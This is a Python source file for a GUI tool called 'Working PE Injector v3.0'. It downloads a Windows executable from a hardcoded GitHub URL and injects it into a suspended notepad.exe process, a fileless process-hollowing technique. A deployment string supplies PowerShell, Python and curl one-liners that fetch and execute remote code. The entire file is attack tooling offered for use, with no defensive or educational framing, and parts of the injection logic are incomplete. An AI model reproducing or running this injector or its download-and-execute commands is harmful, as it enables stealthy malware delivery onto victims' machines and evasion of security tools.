import ctypes
import struct
import urllib.request
import tkinter as tk
from tkinter import ttk, messagebox

# Define all Windows types manually to avoid import issues
DWORD = ctypes.c_ulong
WORD = ctypes.c_ushort
HANDLE = ctypes.c_void_p
LPSTR = ctypes.c_char_p
LPWSTR = ctypes.c_wchar_p
BYTE = ctypes.c_ubyte
ULONGLONG = ctypes.c_ulonglong
SIZE_T = ctypes.c_size_t

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", DWORD),
        ("lpReserved", LPWSTR),
        ("lpDesktop", LPWSTR),
        ("lpTitle", LPWSTR),
        ("dwX", DWORD),
        ("dwY", DWORD),
        ("dwXSize", DWORD),
        ("dwYSize", DWORD),
        ("dwXCountChars", DWORD),
        ("dwYCountChars", DWORD),
        ("dwFillAttribute", DWORD),
        ("dwFlags", DWORD),
        ("wShowWindow", WORD),
        ("cbReserved2", WORD),
        ("lpReserved2", ctypes.POINTER(BYTE)),
        ("hStdInput", HANDLE),
        ("hStdOutput", HANDLE),
        ("hStdError", HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", HANDLE),
        ("hThread", HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadId", DWORD),
    ]

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4
CREATE_NO_WINDOW = 0x08000000

k32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

class WorkingInjector:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Working PE Injector v3.0")
        self.root.geometry("600x400")
        
        # GUI
        frame = ttk.Frame(self.root, padding="10")
        frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        ttk.Label(frame, text="PE File URL:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.pe_url = ttk.Entry(frame, width=60)
        self.pe_url.grid(row=0, column=1, pady=5, padx=5)
        self.pe_url.insert(0, "https://raw.githubusercontent.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/main/RhAS8@nga/rCTnJexpp1.exe")
        
        ttk.Label(frame, text="Target Process:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.target_proc = ttk.Entry(frame, width=30)
        self.target_proc.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)
        self.target_proc.insert(0, "notepad.exe")
        
        ttk.Button(frame, text="Inject Fileless", command=self.inject).grid(row=2, column=0, columnspan=2, pady=15)
        
        self.status = ttk.Label(frame, text="Status: Ready")
        self.status.grid(row=3, column=0, columnspan=2, pady=5)
        
        self.log = tk.Text(frame, height=10, width=70)
        self.log.grid(row=4, column=0, columnspan=2, pady=10)
        self.log.insert('1.0', "Injector ready\n")
    
    def log_msg(self, msg):
        self.log.insert('end', f"{msg}\n")
        self.log.see('end')
    
    def download(self, url):
        self.log_msg(f"[1] Downloading: {url}")
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=30) as r:
                data = r.read()
                self.log_msg(f"[2] Downloaded {len(data):,} bytes")
                return bytearray(data)
        except Exception as e:
            self.log_msg(f"[-] Download error: {e}")
            return None
    
    def inject(self):
        url = self.pe_url.get()
        target = self.target_proc.get().strip()
        
        if not url or not target:
            messagebox.showwarning("Error", "Enter URL and target process")
            return
        
        self.log_msg("\n" + "="*50)
        self.log_msg("[START] Fileless injection")
        
        # Download PE
        pe_data = self.download(url)
        if not pe_data or len(pe_data) < 100:
            messagebox.showerror("Error", "Invalid or empty PE file")
            return
        
        # Validate PE
        if pe_data[0:2] != b'MZ':
            messagebox.showerror("Error", "Not a valid PE file (MZ header missing)")
            return
        
        self.status.config(text="Status: Injecting...")
        self.root.update()
        
        # Perform injection
        if self.do_injection(pe_data, target):
            self.status.config(text="Status: Success!")
            messagebox.showinfo("Success", "Injection completed")
        else:
            self.status.config(text="Status: Failed")
            messagebox.showerror("Error", "Injection failed")
    
    def do_injection(self, pe_data, target_cmd):
        try:
            # Step 1: Parse PE
            pe_offset = struct.unpack('<I', pe_data[60:64])[0]
            if pe_offset + 248 > len(pe_data):
                self.log_msg("[-] PE header out of bounds")
                return False
            
            image_size = struct.unpack('<I', pe_data[pe_offset+80:pe_offset+84])[0]
            self.log_msg(f"[3] PE Size: {image_size:,} bytes")
            
            # Step 2: Create suspended process
            si = STARTUPINFO()
            si.cb = ctypes.sizeof(STARTUPINFO)
            pi = PROCESS_INFORMATION()
            
            self.log_msg(f"[4] Creating: {target_cmd}")
            
            if not k32.CreateProcessW(
                None,
                target_cmd,
                None,
                None,
                False,
                CREATE_SUSPENDED,
                None,
                None,
                ctypes.byref(si),
                ctypes.byref(pi)
            ):
                error = ctypes.GetLastError()
                self.log_msg(f"[-] CreateProcess failed: {error}")
                return False
            
            # Step 3: Allocate memory
            alloc_addr = k32.VirtualAllocEx(
                pi.hProcess,
                0,
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            )
            
            if not alloc_addr:
                error = ctypes.GetLastError()
                self.log_msg(f"[-] VirtualAllocEx failed: {error}")
                k32.CloseHandle(pi.hProcess)
                k32.CloseHandle(pi.hThread)
                return False
            
            self.log_msg(f"[5] Allocated at: {hex(alloc_addr)}")
            
            # Step 4: Write PE
            written = SIZE_T(0)
            
            # Write headers
            opt_header_size = struct.unpack('<H', pe_data[pe_offset+20:pe_offset+22])[0]
            header_size = pe_offset + 24 + opt_header_size
            
            success = k32.WriteProcessMemory(
                pi.hProcess,
                alloc_addr,
                ctypes.c_char_p(bytes(pe_data[:header_size])),
                header_size,
                ctypes.byref(written)
            )
            
            if not success or written.value != header_size:
                self.log_msg(f"[-] Header write failed")
                k32.CloseHandle(pi.hProcess)
                k32.CloseHandle(pi.hThread)
                return False
            
            # Step 5: Write sections
            num_sections = struct.unpack('<H', pe_data[pe_offset+6:pe_offset+8])[0]
            section_table = pe_offset + 248
            self.log_msg(f"[6] Writing {num_sections} sections")
            
            for i in range(num_sections):
                sec_start = section_table + (i * 40)
                if sec_start + 40 > len(pe_data):
                    break
                
                # Get section info
                va = struct.unpack('<I', pe_data[sec_start+12:sec_start+16])[0]
                raw_size = struct.unpack('<I', pe_data[sec_start+16:sec_start+20])[0]
                raw_offset = struct.unpack('<I', pe_data[sec_start+20:sec_start+24])[0]
                
                if raw_size > 0 and raw_offset + raw_size <= len(pe_data):
                    section_data = pe_data[raw_offset:raw_offset + raw_size]
                    k32.WriteProcessMemory(
                        pi.hProcess,
                        alloc_addr + va,
                        ctypes.c_char_p(bytes(section_data)),
                        raw_size,
                        ctypes.byref(written)
                    )
            
            # Step 6: Set entry point
            entry_point = struct.unpack('<I', pe_data[pe_offset+40:pe_offset+44])[0]
            entry_addr = alloc_addr + entry_point
            
            # For x64 context
            class CONTEXT(ctypes.Structure):
                _fields_ = [
                    ("p1_home", ULONGLONG),
                    ("p2_home", ULONGLONG),
                    ("p3_home", ULONGLONG),
                    ("p4_home", ULONGLONG),
                    ("p5_home", ULONGLONG),
                    ("p6_home", ULONGLONG),
                    ("context_flags", DWORD),
                    ("mx_csr", DWORD),
                    ("seg_cs", WORD),
                    ("seg_ds", WORD),
                    ("seg_es", WORD),
                    ("seg_fs", WORD),
                    ("seg_gs", WORD),
                    ("seg_ss", WORD),
                    ("eflags", DWORD),
                    ("dr0", ULONGLONG),
                    ("dr1", ULONGLONG),
                    ("dr2", ULONGLONG),
                    ("dr3", ULONGLONG),
                    ("dr6", ULONGLONG),
                    ("dr7", ULONGLONG),
                    ("rax", ULONGLONG),
                    ("rcx", ULONGLONG),
                    ("rdx", ULONGLONG),
                    ("rbx", ULONGLONG),
                    ("rsp", ULONGLONG),
                    ("rbp", ULONGLONG),
                    ("rsi", ULONGLONG),
                    ("rdi", ULONGLONG),
                    ("r8", ULONGLONG),
                    ("r9", ULONGLONG),
                    ("r10", ULONGLONG),
                    ("r11", ULONGLONG),
                    ("r12", ULONGLONG),
                    ("r13", ULONGLONG),
                    ("r14", ULONGLONG),
                    ("r15", ULONGLONG),
                    ("rip", ULONGLONG),
                    ("fltsave", BYTE * 512),
                ]
            
            context = CONTEXT()
            context.context_flags = 0x10007  # CONTEXT_FULL
            
            # Get thread context
            k32.GetThreadContext = k32.GetThreadContext
            k32.GetThreadContext.argtypes = [HANDLE, ctypes.POINTER(CONTEXT)]
            k32.GetThreadContext.restype = ctypes.c_bool
            
            k32.SetThreadContext = k32.SetThreadContext
            k32.SetThreadContext.argtypes = [HANDLE, ctypes.POINTER(CONTEXT)]
            k32.SetThreadContext.restype = ctypes.c_bool
            
            if k32.GetThreadContext(pi.hThread, ctypes.byref(context)):
                context.rcx = entry_addr  # Entry point for x64
                k32.SetThreadContext(pi.hThread, ctypes.byref(context))
            
            # Step 7: Resume
            self.log_msg("[7] Resuming thread")
            k32.ResumeThread(pi.hThread)
            
            # Step 8: Cleanup
            k32.CloseHandle(pi.hThread)
            k32.CloseHandle(pi.hProcess)
            
            self.log_msg("[8] Injection successful!")
            return True
            
        except Exception as e:
            self.log_msg(f"[-] Exception: {str(e)}")
            import traceback
            self.log_msg(traceback.format_exc())
            return False

# Deployment code
deploy_guide = """
=== ONE-LINER TO RUN FROM LINK ===

PowerShell (Run as Administrator):
powershell -Command "$u='RAW_GITHUB_URL_HERE'; $c=(Invoke-WebRequest -Uri $u).Content; Invoke-Expression $c"

Python:
python -c "import urllib.request; exec(urllib.request.urlopen('RAW_GITHUB_URL_HERE').read().decode('utf-8'))"

CMD (with curl):
curl -s RAW_GITHUB_URL_HERE | python
"""

if __name__ == "__main__":
    # Test if running with admin rights (recommended)
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            print("Warning: Run as Administrator for best results")
    except:
        pass
    
    app = WorkingInjector()
    app.log_msg("✓ Fixed: No wintypes dependencies")
    app.log_msg("✓ Working injection ready")
    app.root.mainloop()
